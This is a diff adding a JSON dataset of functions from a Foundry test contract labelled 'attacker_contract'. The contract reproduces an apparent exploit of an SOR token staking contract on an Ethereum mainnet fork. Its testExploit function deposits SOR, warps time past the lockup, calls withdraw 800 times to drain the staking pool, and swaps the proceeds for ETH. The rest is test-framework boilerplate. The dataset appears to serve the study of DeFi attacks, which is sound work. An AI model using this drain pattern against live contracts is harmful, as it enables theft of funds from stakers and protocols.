@@ -1,0 +1,93 @@
+[
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"mainnet\", 21450734);\n        // attacker buy sor\n        deal(address(SOR), address(this), 122868871710593438486048);\n        deal(address(this),0);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] ETH balance before\", address(this).balance, 18);\n        SOR.approve(sorStaking, type(uint256).max);\n\n        bytes memory depositData = abi.encodeWithSignature(\n            \"deposit(uint256,uint8)\",\n            122868871710593438486048,  // \u4f7f\u7528\u5168\u90e8SOR\u4ee3\u5e01\u6570\u91cf\n            0  // tier\u8bbe\u4e3a0\n        );\n\n        (bool success,) = sorStaking.call(depositData);\n        require(success, \"deposit failed\");\n        console.log(\"Current before block timestamp:\", block.timestamp);\n        cheats.warp(block.timestamp + 14 days + 1);\n        console.log(\"Current after block timestamp:\", block.timestamp);\n        bytes memory withdrawData = abi.encodeWithSignature(\n            \"withdraw(uint256)\",\n            1\n        );\n        \n        for(uint i = 0; i < 800; i++) {\n            (bool withdrawSuccess,) = sorStaking.call(withdrawData);\n            require(withdrawSuccess, \"withdraw failed\");\n        }\n\n        // \u5c06SOR\u4ee3\u5e01\u6362\u6210ETH,\u53eawrap\u4e86\u65f6\u95f4\uff0c\u6ca1\u6709roll blocknumber\u6240\u4ee5\u5151\u6362\u7684eth\u4f1a\u6709\u5dee\u5f02\n        SOR.approve(address(router), SOR.balanceOf(address(this)));\n        address[] memory path = new address[](2);\n        path[0] = address(SOR);\n        path[1] = address(router.WETH());\n        for(uint i = 0; i < 7; i++) {\n            router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n                700000000000000000000000, // --> max sell amount \n                0,\n                path,\n                address(this),\n                block.timestamp\n            );\n        }\n\n        emit log_named_decimal_uint(\"[End] ETH balance after\", address(this).balance, 18);\n    }\n\n",
+    "description": ""
+  }
+]
